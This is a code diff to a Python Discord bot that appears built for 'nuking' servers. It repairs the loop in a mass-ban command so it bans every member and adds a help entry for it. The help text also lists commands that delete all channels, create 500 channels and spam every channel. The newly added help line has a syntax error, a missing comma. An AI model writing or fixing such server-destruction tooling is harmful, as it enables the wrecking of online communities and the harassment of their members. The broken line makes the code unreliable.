@@ -75,7 +75,7 @@ async def b(ctx,reason=None):
   members=ctx.guild.members
   await ctx.message.delete()
 
-  for member in member:
+  for member in members:
     try:
        await member.ban(reason=reason)
     except:
@@ -84,10 +84,11 @@ async def b(ctx,reason=None):
 @client.command()
 async def commands(ctx):
  
-  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
+  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.red(),inline=False)
   embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
   embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
   embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
+  embed.add_field(name="**b**",value="b for mass ban (banall)"inline=False)
   embed.set_footer(text="developed by Saad.")
 
   await ctx.send(embed=embed)
